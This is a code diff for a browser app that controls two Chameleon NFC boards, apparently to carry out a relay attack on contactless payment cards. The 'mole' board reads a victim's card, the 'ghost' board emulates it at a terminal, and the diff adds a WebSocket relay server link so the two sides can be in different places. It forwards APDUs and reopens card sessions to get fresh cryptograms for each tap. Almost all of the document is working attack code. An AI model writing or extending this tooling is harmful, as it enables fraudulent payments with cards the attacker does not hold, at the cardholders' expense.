@@ -18,7 +18,7 @@
  */
 'use strict';
 
-const BUILD = '2026-09-07d tail-trim';   // shown in the log so you can confirm which version loaded
+const BUILD = '2026-09-07e phase2';   // shown in the log so you can confirm which version loaded
 
 // --- Nordic UART Service (verified in firmware ble_main.c / ble_nus) ---------
 const NUS_SERVICE = '6e400001-b5a3-f393-e0a9-e50e24dcca9e';
@@ -63,6 +63,9 @@ function concat(...parts) {
 function hex(b) {
   if (!b || !b.length) return '(empty)';
   return Array.from(b, x => x.toString(16).padStart(2, '0')).join(' ').toUpperCase();
+}
+function hxc(b) {  // compact hex (no spaces) for the wire
+  return Array.from(b, x => x.toString(16).padStart(2, '0')).join('');
 }
 function hexToBytes(s) {
   s = s.replace(/\s+/g, '');
@@ -259,10 +262,81 @@ class ChameleonBLE {
 }
 
 // ---------------------------------------------------------------------------
+// Phase 2: WebSocket rendezvous link + remote-mole proxy
+// ---------------------------------------------------------------------------
+// The ghost phone talks to the remote mole phone through a room on the relay
+// server. WSMole gives the ghost-side loop the same method surface as a local
+// mole board, so the loop code is identical whether the mole is local or remote.
+class WSLink {
+  constructor() {
+    this.ws = null; this.waiters = new Map(); this.onReq = null; this.onPeers = null;
+    this.onClose = null; this.peers = 0; this.roles = [];
+    this.mole = new WSMole(this);
+  }
+  get connected() { return !!(this.ws && this.ws.readyState === 1); }
+  connect(url, room, role) {
+    return new Promise((resolve, reject) => {
+      let ws;
+      try { ws = new WebSocket(url); } catch (e) { reject(e); return; }
+      this.ws = ws;
+      const to = setTimeout(() => { try { ws.close(); } catch (_) {} reject(new Error('link connect timeout')); }, 8000);
+      ws.onopen = () => ws.send(JSON.stringify({ t: 'join', room, role }));
+      ws.onmessage = (ev) => {
+        let m; try { m = JSON.parse(ev.data); } catch { return; }
+        if (m.t === 'joined') { clearTimeout(to); this.peers = m.n; this.roles = m.roles || []; resolve(m); return; }
+        if (m.t === 'error') { clearTimeout(to); reject(new Error('link: ' + m.reason)); return; }
+        if (m.t === 'peers') { this.peers = m.n; this.roles = m.roles || []; if (this.onPeers) this.onPeers(m); return; }
+        const q = this.waiters.get(m.t);
+        if (q && q.length) { const w = q.shift(); clearTimeout(w.to); w.resolve(m); return; }
+        if (this.onReq) this.onReq(m);   // inbound request for the mole-serve handler
+      };
+      ws.onerror = () => {};
+      ws.onclose = () => { this.ws = null; if (this.onClose) this.onClose(); };
+    });
+  }
+  send(obj) { if (this.connected) this.ws.send(JSON.stringify(obj)); }
+  request(obj, respType, timeoutMs = 6000) {
+    return new Promise((resolve, reject) => {
+      if (!this.waiters.has(respType)) this.waiters.set(respType, []);
+      const q = this.waiters.get(respType);
+      const w = { resolve, to: setTimeout(() => { const i = q.indexOf(w); if (i >= 0) q.splice(i, 1); reject(new Error('link timeout ' + respType)); }, timeoutMs) };
+      q.push(w);
+      this.send(obj);
+    });
+  }
+  close() { try { this.ws && this.ws.close(); } catch (_) {} this.ws = null; }
+}
+
+// Ghost-side view of the remote mole: same surface as a ChameleonBLE mole so the
+// relay loop is transport-agnostic. changeMode/setLed are no-ops (the mole phone
+// inits its own board and drives its own LED).
+class WSMole {
+  constructor(link) { this.link = link; }
+  async changeMode() { return { status: 0 }; }
+  async setLed() { return { status: 0 }; }
+  async cardProbe(force) {
+    const r = await this.link.request({ t: 'stat', force: !!force }, 'stat_res', 4000);
+    return { status: r.present ? ST.HF_TAG_OK : ST.HF_TAG_NO };
+  }
+  async relayStart() {
+    const r = await this.link.request({ t: 'scan' }, 'scan_res', 6000);
+    if (r.uid) return { status: ST.HF_TAG_OK, parsed: { uid: hexToBytes(r.uid), atqa: hexToBytes(r.atqa), sak: r.sak, ats: hexToBytes(r.ats) } };
+    return { status: ST.HF_TAG_NO };
+  }
+  async relayApdu(apdu) {
+    const r = await this.link.request({ t: 'apdu', apdu: hxc(apdu) }, 'apdu_res', 6000);
+    return { status: r.st, data: hexToBytes(r.data || '') };
+  }
+  async relayStop() { this.link.send({ t: 'stop' }); return { status: 0 }; }
+}
+
+// ---------------------------------------------------------------------------
 // UI wiring + relay orchestration
 // ---------------------------------------------------------------------------
 const ghost = new ChameleonBLE('ghost');   // board1, at the terminal/phone
 const mole  = new ChameleonBLE('mole');    // board2, at the card
+const wsLink = new WSLink();
+const currentRole = () => (document.querySelector('input[name=role]:checked') || {}).value || 'local';
 let running = false;
 let apduCount = 0;
 
@@ -291,9 +365,43 @@ function setDevUI(who, dev) {
 }
 
 function updateStartEnabled() {
-  const ready = ghost.connected && mole.connected && !running;
-  $('start').disabled = !ready;
+  const role = currentRole();
+  let ready;
+  if (role === 'local')      ready = ghost.connected && mole.connected;
+  else if (role === 'ghost') ready = ghost.connected && wsLink.connected;
+  else                       ready = mole.connected && wsLink.connected;   // mole
+  $('start').disabled = !(ready && !running);
   $('stop').disabled = !running;
+  $('start').textContent = role === 'mole' ? 'Start serving' : 'Start relay';
+}
+
+// Show only the controls relevant to the selected role.
+function applyRole() {
+  const role = currentRole();
+  $('ghost-card').hidden = (role === 'mole');
+  $('mole-card').hidden = (role === 'ghost');
+  $('link-row').hidden = (role === 'local');
+  $('mode-row').hidden = (role === 'mole');   // mole doesn't choose A/B; the ghost does
+  updateStartEnabled();
+}
+
+async function toggleLink() {
+  if (wsLink.connected) { wsLink.close(); return; }
+  const url = $('server-url').value.trim();
+  const room = $('room-code').value.trim();
+  if (!url || !room) { log('enter a server URL and room code', 'warn'); return; }
+  try {
+    log(`connecting to relay ${url} room "${room}" as ${currentRole()}…`);
+    wsLink.onClose = () => { log('relay link closed', 'warn'); $('link-btn').textContent = 'Connect link'; $('link-status').textContent = 'not connected'; if (running) stopRelay(); updateStartEnabled(); };
+    wsLink.onPeers = (m) => { $('link-status').textContent = `linked · ${m.n}/2 in room (${(m.roles || []).join(', ') || '—'})`; };
+    const j = await wsLink.connect(url, room, currentRole());
+    $('link-btn').textContent = 'Disconnect link';
+    $('link-status').textContent = `linked · ${j.n}/2 in room`;
+    log(`relay link up — ${j.n}/2 in room "${room}"`, 'ok');
+    updateStartEnabled();
+  } catch (e) {
+    log(`link connect failed: ${e.message || e}`, 'err');
+  }
 }
 
 async function toggleConnect(who) {
@@ -334,17 +442,17 @@ async function armGhost(anti, slot) {
 async function armEmulation(anti) { await ghost.setAntiColl(anti); await ghost.changeMode(false); }
 async function disarmEmulation() { await ghost.changeMode(true); }
 
-async function cloneFromMole(slot) {
+async function cloneFromMole(M, slot) {
   let warned = false;
   while (running) {
     let p;
-    try { p = await mole.cardProbe(true); } catch (_) { await sleep(300); continue; }
+    try { p = await M.cardProbe(true); } catch (_) { await sleep(300); continue; }
     if (p.status === ST.HF_TAG_OK) {
-      const r = await mole.relayStart();
+      const r = await M.relayStart();
       if (r.status === ST.HF_TAG_OK && r.parsed && r.parsed.ats.length) return r.parsed;
     } else {
-      mole.setLed(3).catch(() => {}); setLedUI('mole', 'red');
-      if (!warned) { log('no card on board2 (mole) — place the card…', 'warn'); warned = true; }
+      M.setLed(3).catch(() => {}); setLedUI('mole', 'red');
+      if (!warned) { log('no card on the mole — place the card…', 'warn'); warned = true; }
     }
     await sleep(300);
   }
@@ -353,6 +461,11 @@ async function cloneFromMole(slot) {
 
 async function startRelay() {
   if (running) return;
+  const role = currentRole();
+  if (role === 'mole') return startMoleServe();   // mole phone serves; the ghost phone drives
+  // mole-facing side: the local board (Local mode) or the remote mole over WS (Ghost mode)
+  const M = (role === 'ghost') ? wsLink.mole : mole;
+  if (role === 'ghost' && !wsLink.connected) { log('not connected to the relay server', 'err'); return; }
   running = true; apduCount = 0;
   updateStartEnabled();
   const mode = document.querySelector('input[name=mode]:checked').value;
@@ -377,13 +490,13 @@ async function startRelay() {
     // Put the MOLE into reader mode first: this initialises the RC522. Probing
     // the field (card_probe/relay_start) before this faults the board on an
     // uninitialised RC522 and drops BLE (role_mole does set_device_reader_mode).
-    await mole.changeMode(true);
+    await M.changeMode(true);
     // stale-card fix: force ghost OUT of emulator mode before cloning, else it
     // keeps emulating the previous run's card (slot persists in flash).
     await ghost.changeMode(true);
     ghost.setLed(3).catch(() => {}); setLedUI('ghost', 'red');
 
-    const anti = await cloneFromMole(slot);
+    const anti = await cloneFromMole(M, slot);
     if (!anti) { return; }            // stopped while waiting
     log(`cloned card UID=${hex(anti.uid)} ATQA=${hex(anti.atqa)} SAK=${anti.sak.toString(16)} ATS=${hex(anti.ats)}`, 'ok');
 
@@ -402,7 +515,7 @@ async function startRelay() {
         const now = Date.now();
         if (now - lastStat > 500) {
           lastStat = now;
-          if (await safeProbe(mole)) {
+          if (await safeProbe(M)) {
             await armEmulation(anti); armed = true;
             ghost.setLed(1).catch(() => {}); setLedUI('ghost', 'green'); setLedUI('mole', 'green');
             log('board2 card seated -> emulation ARMED (phone can read)', 'ok');
@@ -425,7 +538,7 @@ async function startRelay() {
           const now = Date.now();
           if (now - lastStat > 1000) {
             lastStat = now;
-            const present = await safeProbe(mole);
+            const present = await safeProbe(M);
             if (gate && !present) {
               await disarmEmulation(); armed = false;
               ghost.setLed(3).catch(() => {}); setLedUI('ghost', 'red'); setLedUI('mole', 'red');
@@ -444,13 +557,13 @@ async function startRelay() {
 
       if (startsWith(apdu, PPSE_HEAD)) {
         log('--- new transaction (tap) --- re-opening mole session', 'ok');
-        await cloneFromMole(slot);   // fresh card session for a fresh cryptogram
+        await cloneFromMole(M, slot);   // fresh card session for a fresh cryptogram
         apduCount = 0;
       }
       setLedUI('ghost', 'blue'); setLedUI('mole', 'blue');
       const tGot = performance.now();
       let rr;
-      try { rr = await mole.relayApdu(apdu); }
+      try { rr = await M.relayApdu(apdu); }
       catch (_) { rr = { status: ST.HF_TAG_NO, data: new Uint8Array(0) }; }
       const tRelay = performance.now();
       const resp = rr.status === ST.HF_TAG_OK ? rr.data : new Uint8Array(0);
@@ -473,7 +586,7 @@ async function startRelay() {
   } catch (e) {
     log(`relay error: ${e.message || e}`, 'err');
   } finally {
-    try { await mole.relayStop(); } catch (_) {}
+    try { await M.relayStop(); } catch (_) {}
     // Release the ghost too, or it's left armed on a solid-red LED: stop
     // emulating (reader mode) and hand the LED back to the default animation,
     // so BOTH boards return to regular on Stop.
@@ -485,6 +598,83 @@ async function startRelay() {
     log(`=== relay stopped after ${apduCount} APDUs ===`);
     updateStartEnabled();
   }
+}
+
+// Mole phone (Phase 2): connect the local mole board, join the room, and SERVE
+// the ghost phone's requests onto the board. All board access is serialised
+// through one chain so the periodic LED probe never overlaps a relayed APDU.
+async function startMoleServe() {
+  if (!mole.connected) { log('mole board not connected', 'err'); return; }
+  if (!wsLink.connected) { log('not connected to the relay server', 'err'); return; }
+  running = true; updateStartEnabled();
+  $('status').textContent = 'serving (Mole)';
+  log('=== mole serving — waiting for the ghost phone to drive ===', 'ok');
+  try { await mole.changeMode(true); } catch (_) {}   // RC522 init
+
+  let chain = Promise.resolve();
+  const enqueue = (fn) => { const r = chain.then(fn, fn); chain = r.catch(() => {}); return r; };
+
+  wsLink.onReq = (m) => { enqueue(() => handleMoleReq(m)); };
+
+  let lastStat = 0;
+  while (running && wsLink.connected) {
+    const now = Date.now();
+    if (now - lastStat > 1200) {
+      lastStat = now;
+      await enqueue(async () => {
+        const present = await safeProbe(mole);
+        mole.setLed(present ? 1 : 3).catch(() => {});
+        setLedUI('mole', present ? 'green' : 'red');
+      });
+    }
+    await sleep(200);
+  }
+  wsLink.onReq = null;
+  try { await mole.relayStop(); } catch (_) {}
+  try { await mole.setLed(0); } catch (_) {}
+  setLedUI('mole', '');
+  running = false;
+  $('status').textContent = wsLink.connected ? 'stopped' : 'link lost';
+  log('=== mole serving stopped ===');
+  updateStartEnabled();
+}
+
+async function handleMoleReq(m) {
+  try {
+    if (m.t === 'scan') {
+      const anti = await moleServeClone();
+      if (anti) {
+        setLedUI('mole', 'green');
+        wsLink.send({ t: 'scan_res', uid: hxc(anti.uid), atqa: hxc(anti.atqa), sak: anti.sak, ats: hxc(anti.ats) });
+      } else {
+        wsLink.send({ t: 'scan_res' });   // no uid = no card
+      }
+    } else if (m.t === 'apdu') {
+      setLedUI('mole', 'blue');
+      let r; try { r = await mole.relayApdu(hexToBytes(m.apdu)); } catch (_) { r = { status: ST.HF_TAG_NO, data: new Uint8Array(0) }; }
+      wsLink.send({ t: 'apdu_res', st: r.status, data: r.status === ST.HF_TAG_OK ? hxc(r.data) : '' });
+      setLedUI('mole', 'green');
+    } else if (m.t === 'stat') {
+      let present = false; try { present = (await mole.cardProbe(!!m.force)).status === ST.HF_TAG_OK; } catch (_) {}
+      wsLink.send({ t: 'stat_res', present });
+    } else if (m.t === 'stop') {
+      try { await mole.relayStop(); } catch (_) {}
+    }
+  } catch (e) { log('mole serve error: ' + (e.message || e), 'err'); }
+}
+
+async function moleServeClone() {
+  const t0 = Date.now();
+  while (Date.now() - t0 < 2500 && running) {
+    try {
+      if ((await mole.cardProbe(true)).status === ST.HF_TAG_OK) {
+        const r = await mole.relayStart();
+        if (r.status === ST.HF_TAG_OK && r.parsed && r.parsed.ats.length) return r.parsed;
+      } else { setLedUI('mole', 'red'); }
+    } catch (_) {}
+    await sleep(250);
+  }
+  return null;
 }
 
 function stopRelay() { running = false; }
@@ -499,6 +689,12 @@ window.addEventListener('DOMContentLoaded', () => {
   $('start').onclick = startRelay;
   $('stop').onclick = stopRelay;
   $('clear').onclick = () => { $('log').innerHTML = ''; };
+  $('link-btn').onclick = toggleLink;
+  document.querySelectorAll('input[name=role]').forEach(r => r.addEventListener('change', applyRole));
+  // default the server URL sensibly: same host over wss when hosted, ws://localhost for local
+  $('server-url').value = (location.protocol === 'https:')
+    ? '' : 'ws://localhost:8080';
   setDevUI('ghost', ghost); setDevUI('mole', mole);
-  log(`ready (build ${BUILD}). Connect board1 (ghost) and board2 (mole), then Start.`);
+  applyRole();
+  log(`ready (build ${BUILD}). Pick a role: Local (both boards here) · Mole (card side) · Ghost (terminal side).`);
 });
